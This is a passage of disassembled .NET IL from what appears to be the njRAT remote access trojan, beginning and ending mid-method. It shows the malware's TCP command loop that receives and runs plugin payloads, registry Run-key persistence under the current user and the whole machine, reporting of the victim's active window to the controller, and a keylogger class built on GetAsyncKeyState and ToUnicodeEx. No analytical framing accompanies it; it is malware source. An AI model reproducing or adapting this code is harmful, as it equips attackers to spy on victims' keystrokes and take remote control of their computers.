      IL_0033:  leave      IL_01c1

      IL_0038:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_003d:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0042:  ldc.i4.1
      IL_0043:  bge.s      IL_0057

      IL_0045:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_004a:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_004f:  ldc.i4.m1
      IL_0050:  ldc.i4.0
      IL_0051:  callvirt   instance bool [System]System.Net.Sockets.Socket::Poll(int32,
                                                                                 valuetype [System]System.Net.Sockets.SelectMode)
      IL_0056:  pop
      IL_0057:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_005c:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0061:  ldc.i4.0
      IL_0062:  cgt.un
      IL_0064:  brfalse    IL_01b0

      IL_0069:  ldloc.0
      IL_006a:  ldc.i4.m1
      IL_006b:  conv.i8
      IL_006c:  bne.un.s   IL_00e5

      IL_006e:  ldstr      ""
      IL_0073:  stloc.3
      IL_0074:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0079:  callvirt   instance class [System]System.Net.Sockets.NetworkStream [System]System.Net.Sockets.TcpClient::GetStream()
      IL_007e:  callvirt   instance int32 [mscorlib]System.IO.Stream::ReadByte()
      IL_0083:  stloc.2
      IL_0084:  ldloc.2
      IL_0085:  ldc.i4.m1
      IL_0086:  bne.un.s   IL_008d

      IL_0088:  leave      IL_01c1

      IL_008d:  ldloc.2
      IL_008e:  ldc.i4.0
      IL_008f:  bne.un.s   IL_00c3

      IL_0091:  ldloc.3
      IL_0092:  call       int64 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToLong(string)
      IL_0097:  stloc.0
      IL_0098:  ldstr      ""
      IL_009d:  stloc.3
      IL_009e:  ldloc.0
      IL_009f:  ldc.i4.0
      IL_00a0:  conv.i8
      IL_00a1:  bne.un.s   IL_00b1

      IL_00a3:  ldstr      ""
      IL_00a8:  call       bool j.OK::Send(string)
      IL_00ad:  pop
      IL_00ae:  ldc.i4.m1
      IL_00af:  conv.i8
      IL_00b0:  stloc.0
      IL_00b1:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_00b6:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_00bb:  ldc.i4.0
      IL_00bc:  ble        IL_001b

      IL_00c1:  br.s       IL_0057

      IL_00c3:  ldloc.3
      IL_00c4:  ldloc.2
      IL_00c5:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_00ca:  stloc.s    V_9
      IL_00cc:  ldloca.s   V_9
      IL_00ce:  call       instance string [mscorlib]System.Char::ToString()
      IL_00d3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_00d8:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_00dd:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00e2:  stloc.3
      IL_00e3:  br.s       IL_0074

      IL_00e5:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_00ea:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_00ef:  ldc.i4.1
      IL_00f0:  add.ovf
      IL_00f1:  newarr     [mscorlib]System.Byte
      IL_00f6:  stsfld     uint8[] j.OK::b
      IL_00fb:  ldloc.0
      IL_00fc:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0101:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_0106:  sub.ovf
      IL_0107:  stloc.s    V_5
      IL_0109:  ldsfld     uint8[] j.OK::b
      IL_010e:  ldlen
      IL_010f:  conv.ovf.i4
      IL_0110:  conv.i8
      IL_0111:  ldloc.s    V_5
      IL_0113:  ble.s      IL_0127

      IL_0115:  ldloc.s    V_5
      IL_0117:  ldc.i4.1
      IL_0118:  conv.i8
      IL_0119:  sub.ovf
      IL_011a:  conv.ovf.i4
      IL_011b:  ldc.i4.1
      IL_011c:  add.ovf
      IL_011d:  newarr     [mscorlib]System.Byte
      IL_0122:  stsfld     uint8[] j.OK::b
      IL_0127:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_012c:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_0131:  ldsfld     uint8[] j.OK::b
      IL_0136:  ldc.i4.0
      IL_0137:  ldsfld     uint8[] j.OK::b
      IL_013c:  ldlen
      IL_013d:  conv.ovf.i4
      IL_013e:  ldc.i4.0
      IL_013f:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Receive(uint8[],
                                                                                     int32,
                                                                                     int32,
                                                                                     valuetype [System]System.Net.Sockets.SocketFlags)
      IL_0144:  stloc.s    V_4
      IL_0146:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_014b:  ldsfld     uint8[] j.OK::b
      IL_0150:  ldc.i4.0
      IL_0151:  ldloc.s    V_4
      IL_0153:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0158:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_015d:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_0162:  ldloc.0
      IL_0163:  bne.un.s   IL_01ab

      IL_0165:  ldc.i4.m1
      IL_0166:  conv.i8
      IL_0167:  stloc.0
      IL_0168:  ldnull
      IL_0169:  ldftn      void j.OK::_Lambda$__1(object)
      IL_016f:  newobj     instance void [mscorlib]System.Threading.ParameterizedThreadStart::.ctor(object,
                                                                                                    native int)
      IL_0174:  ldc.i4.1
      IL_0175:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ParameterizedThreadStart,
                                                                                  int32)
      IL_017a:  stloc.s    V_6
      IL_017c:  ldloc.s    V_6
      IL_017e:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0183:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0188:  callvirt   instance void [mscorlib]System.Threading.Thread::Start(object)
      IL_018d:  ldloc.s    V_6
      IL_018f:  ldc.i4.s   100
      IL_0191:  callvirt   instance bool [mscorlib]System.Threading.Thread::Join(int32)
      IL_0196:  pop
      IL_0197:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_019c:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_01a1:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_01a6:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_01ab:  br         IL_001b

      IL_01b0:  leave.s    IL_01c1

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01b2:  dup
      IL_01b3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01b8:  stloc.s    V_7
      IL_01ba:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01bf:  leave.s    IL_01c1

    }  // end handler
    IL_01c1:  nop
    .try
    {
      IL_01c2:  ldsfld     object j.OK::PLG
      IL_01c7:  brfalse.s  IL_01ea

      IL_01c9:  ldsfld     object j.OK::PLG
      IL_01ce:  ldnull
      IL_01cf:  ldstr      "clear"
      IL_01d4:  ldc.i4.0
      IL_01d5:  newarr     [mscorlib]System.Object
      IL_01da:  ldnull
      IL_01db:  ldnull
      IL_01dc:  ldnull
      IL_01dd:  ldc.i4.1
      IL_01de:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_01e3:  pop
      IL_01e4:  ldnull
      IL_01e5:  stsfld     object j.OK::PLG
      IL_01ea:  leave.s    IL_01fb

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01ec:  dup
      IL_01ed:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01f2:  stloc.s    V_8
      IL_01f4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01f9:  leave.s    IL_01fb

    }  // end handler
    IL_01fb:  ldc.i4.0
    IL_01fc:  stsfld     bool j.OK::Cn
    IL_0201:  call       bool j.OK::connect()
    IL_0206:  brtrue.s   IL_020a

    IL_0208:  br.s       IL_01c1

    IL_020a:  ldc.i4.1
    IL_020b:  stsfld     bool j.OK::Cn
    IL_0210:  br         IL_0000
  } // end of method OK::RC

  .method public static void  ko() cil managed
  {
    // Code size       744 (0x2e8)
    .maxstack  5
    .locals init (int32 V_0,
             bool V_1,
             string V_2,
             class [mscorlib]System.Threading.Thread V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             string V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11,
             class j.kl V_12)
    IL_0000:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Command()
    IL_0005:  brfalse.s  IL_0040

    .try
    {
      IL_0007:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_000c:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0011:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0016:  ldstr      "di"
      IL_001b:  ldstr      "!"
      IL_0020:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_0025:  leave.s    IL_0036

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0027:  dup
      IL_0028:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_002d:  stloc.s    V_4
      IL_002f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0034:  leave.s    IL_0036

    }  // end handler
    IL_0036:  ldc.i4     0x1388
    IL_003b:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0040:  ldc.i4.0
    IL_0041:  stloc.1
    IL_0042:  ldc.i4.1
    IL_0043:  ldsfld     string j.OK::RG
    IL_0048:  ldloca.s   V_1
    IL_004a:  newobj     instance void [mscorlib]System.Threading.Mutex::.ctor(bool,
                                                                               string,
                                                                               bool&)
    IL_004f:  stsfld     object j.OK::MT
    IL_0054:  ldloc.1
    IL_0055:  brtrue.s   IL_005c

    IL_0057:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_005c:  call       void j.OK::INS()
    IL_0061:  ldsfld     bool j.OK::Idr
    IL_0066:  brtrue.s   IL_008b

    IL_0068:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_006d:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0072:  stsfld     string j.OK::EXE
    IL_0077:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_007c:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_0081:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0086:  stsfld     string j.OK::DR
    IL_008b:  ldnull
    IL_008c:  ldftn      void j.OK::RC()
    IL_0092:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_0097:  ldc.i4.1
    IL_0098:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_009d:  stloc.3
    IL_009e:  ldloc.3
    IL_009f:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    .try
    {
      IL_00a4:  newobj     instance void j.kl::.ctor()
      IL_00a9:  stsfld     class j.kl j.OK::kq
      IL_00ae:  ldsfld     class j.kl j.OK::kq
      IL_00b3:  dup
      IL_00b4:  ldvirtftn  instance void j.kl::WRK()
      IL_00ba:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_00bf:  ldc.i4.1
      IL_00c0:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                  int32)
      IL_00c5:  stloc.3
      IL_00c6:  ldloc.3
      IL_00c7:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_00cc:  leave.s    IL_00dd

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00ce:  dup
      IL_00cf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00d4:  stloc.s    V_5
      IL_00d6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00db:  leave.s    IL_00dd

    }  // end handler
    IL_00dd:  ldc.i4.0
    IL_00de:  stloc.0
    IL_00df:  ldstr      ""
    IL_00e4:  stloc.2
    IL_00e5:  ldsfld     bool j.OK::BD
    IL_00ea:  brfalse.s  IL_0114

    .try
    {
      IL_00ec:  ldnull
      IL_00ed:  ldftn      void j.OK::_Lambda$__2(object,
                                                              class [System]Microsoft.Win32.SessionEndingEventArgs)
      IL_00f3:  newobj     instance void [System]Microsoft.Win32.SessionEndingEventHandler::.ctor(object,
                                                                                                  native int)
      IL_00f8:  call       void [System]Microsoft.Win32.SystemEvents::add_SessionEnding(class [System]Microsoft.Win32.SessionEndingEventHandler)
      IL_00fd:  ldc.i4.1
      IL_00fe:  call       void j.OK::pr(int32)
      IL_0103:  leave.s    IL_0114

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0105:  dup
      IL_0106:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_010b:  stloc.s    V_6
      IL_010d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0112:  leave.s    IL_0114

    }  // end handler
    IL_0114:  ldc.i4     0x3e8
    IL_0119:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_011e:  ldsfld     bool j.OK::Cn
    IL_0123:  brtrue.s   IL_012b

    IL_0125:  ldstr      ""
    IL_012a:  stloc.2
    IL_012b:  call       void [System.Windows.Forms]System.Windows.Forms.Application::DoEvents()
    .try
    {
      IL_0130:  ldloc.0
      IL_0131:  ldc.i4.1
      IL_0132:  add.ovf
      IL_0133:  stloc.0
      IL_0134:  ldloc.0
      IL_0135:  ldc.i4.5
      IL_0136:  bne.un.s   IL_015d

      .try
      {
        IL_0138:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
        IL_013d:  ldc.i4     0x400
        IL_0142:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
        IL_0147:  callvirt   instance void [System]System.Diagnostics.Process::set_MinWorkingSet(native int)
        IL_014c:  leave.s    IL_015d

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_014e:  dup
        IL_014f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0154:  stloc.s    V_7
        IL_0156:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_015b:  leave.s    IL_015d

      }  // end handler
      IL_015d:  ldloc.0
      IL_015e:  ldc.i4.8
      IL_015f:  blt.s      IL_0190

      IL_0161:  ldc.i4.0
      IL_0162:  stloc.0
      IL_0163:  call       string j.OK::ACT()
      IL_0168:  stloc.s    V_8
      IL_016a:  ldloc.2
      IL_016b:  ldloc.s    V_8
      IL_016d:  ldc.i4.0
      IL_016e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0173:  ldc.i4.0
      IL_0174:  beq.s      IL_0190

      IL_0176:  ldloc.s    V_8
      IL_0178:  stloc.2
      IL_0179:  ldstr      "act"
      IL_017e:  ldsfld     string j.OK::Y
      IL_0183:  ldloc.s    V_8
      IL_0185:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_018a:  call       bool j.OK::Send(string)
      IL_018f:  pop
      IL_0190:  ldsfld     bool j.OK::Isu
      IL_0195:  brfalse    IL_02d2

      .try
      {
        IL_019a:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_019f:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_01a4:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_01a9:  ldsfld     string j.OK::sf
        IL_01ae:  ldstr      "\\"
        IL_01b3:  ldsfld     string j.OK::RG
        IL_01b8:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_01bd:  ldstr      ""
        IL_01c2:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_01c7:  ldstr      "\""
        IL_01cc:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_01d1:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_01d6:  ldstr      "\" .."
        IL_01db:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_01e0:  ldc.i4.0
        IL_01e1:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_01e6:  brfalse.s  IL_0225

        IL_01e8:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_01ed:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_01f2:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_01f7:  ldsfld     string j.OK::sf
        IL_01fc:  ldc.i4.1
        IL_01fd:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_0202:  ldsfld     string j.OK::RG
        IL_0207:  ldstr      "\""
        IL_020c:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_0211:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0216:  ldstr      "\" .."
        IL_021b:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0220:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_0225:  leave.s    IL_0236

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0227:  dup
        IL_0228:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_022d:  stloc.s    V_9
        IL_022f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0234:  leave.s    IL_0236

      }  // end handler
      .try
      {
        IL_0236:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_023b:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_0240:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_0245:  ldsfld     string j.OK::sf
        IL_024a:  ldstr      "\\"
        IL_024f:  ldsfld     string j.OK::RG
        IL_0254:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0259:  ldstr      ""
        IL_025e:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_0263:  ldstr      "\""
        IL_0268:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_026d:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0272:  ldstr      "\" .."
        IL_0277:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_027c:  ldc.i4.0
        IL_027d:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_0282:  brfalse.s  IL_02c1

        IL_0284:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_0289:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_028e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_0293:  ldsfld     string j.OK::sf
        IL_0298:  ldc.i4.1
        IL_0299:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_029e:  ldsfld     string j.OK::RG
        IL_02a3:  ldstr      "\""
        IL_02a8:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_02ad:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_02b2:  ldstr      "\" .."
        IL_02b7:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_02bc:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_02c1:  leave.s    IL_02d2

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_02c3:  dup
        IL_02c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02c9:  stloc.s    V_10
        IL_02cb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02d0:  leave.s    IL_02d2

      }  // end handler
      IL_02d2:  leave.s    IL_02e3

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02d4:  dup
      IL_02d5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02da:  stloc.s    V_11
      IL_02dc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02e1:  leave.s    IL_02e3

    }  // end handler
    IL_02e3:  br         IL_0114
  } // end of method OK::ko

  .method private specialname static void 
          _Lambda$__1(object a0) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       12 (0xc)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  castclass  uint8[]
    IL_0006:  call       void j.OK::Ind(uint8[])
    IL_000b:  ret
  } // end of method OK::_Lambda$__1

  .method private specialname static void 
          _Lambda$__2(object a0,
                      class [System]Microsoft.Win32.SessionEndingEventArgs a1) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  call       void j.OK::ED()
    IL_0005:  ret
  } // end of method OK::_Lambda$__2

} // end of class j.OK

.class public auto ansi j.A
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method A::.ctor

  .method public static void  main() cil managed
  {
    .entrypoint
    .custom instance void [mscorlib]System.STAThreadAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  call       void j.OK::ko()
    IL_0005:  ret
  } // end of method A::main

} // end of class j.A

.class public auto ansi j.kl
       extends [mscorlib]System.Object
{
  .field private int32 LastAV
  .field private string LastAS
  .field private valuetype [System.Windows.Forms]System.Windows.Forms.Keys lastKey
  .field public string Logs
  .field public string vn
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       36 (0x24)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldc.i4.0
    IL_0008:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys j.kl::lastKey
    IL_000d:  ldarg.0
    IL_000e:  ldstr      ""
    IL_0013:  stfld      string j.kl::Logs
    IL_0018:  ldarg.0
    IL_0019:  ldstr      "[kl]"
    IL_001e:  stfld      string j.kl::vn
    IL_0023:  ret
  } // end of method kl::.ctor

  .method private static pinvokeimpl("user32.dll" winapi) 
          int32  ToUnicodeEx(uint32 a,
                             uint32 b,
                             uint8[] c,
                             [out] class [mscorlib]System.Text.StringBuilder  marshal( lpwstr) d,
                             int32 e,
                             uint32 f,
                             native int g) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          bool  GetKeyboardState(uint8[] a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          uint32  MapVirtualKey(uint32 a,
                                uint32 b) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          int32  GetWindowThreadProcessId(native int a,
                                          int32& b) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int32  GetKeyboardLayout(int32 a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int16  GetAsyncKeyState(int32 a) cil managed preservesig
  {
  }
  .method private instance string  AV() cil managed
  {
    // Code size       217 (0xd9)
    .maxstack  4
    .locals init (string V_0,
             int32 V_1,
             native int V_2,
             class [System]System.Diagnostics.Process V_3,
             class [mscorlib]System.Exception V_4,
             valuetype [mscorlib]System.DateTime V_5,
             string[] V_6)
    .try
    {
      IL_0000:  call       native int j.OK::GetForegroundWindow()
      IL_0005:  stloc.2
      IL_0006:  ldloc.2
      IL_0007:  ldloca.s   V_1
      IL_0009:  call       int32 j.kl::GetWindowThreadProcessId(native int,
                                                                            int32&)
      IL_000e:  pop
      IL_000f:  ldloc.1
      IL_0010:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_0015:  stloc.3
      IL_0016:  ldloca.s   V_2
      IL_0018:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_001d:  ldarg.0
      IL_001e:  ldfld      int32 j.kl::LastAV
      IL_0023:  ceq
      IL_0025:  ldarg.0
      IL_0026:  ldfld      string j.kl::LastAS
      IL_002b:  ldloc.3
      IL_002c:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0031:  ldc.i4.0
      IL_0032:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0037:  ldc.i4.0
      IL_0038:  ceq
      IL_003a:  and
      IL_003b:  ldloc.3
      IL_003c:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0041:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0046:  ldc.i4.0
      IL_0047:  ceq
      IL_0049:  or
      IL_004a:  brfalse.s  IL_0051

      IL_004c:  leave      IL_00d1

      IL_0051:  ldarg.0
      IL_0052:  ldloca.s   V_2
      IL_0054:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_0059:  stfld      int32 j.kl::LastAV
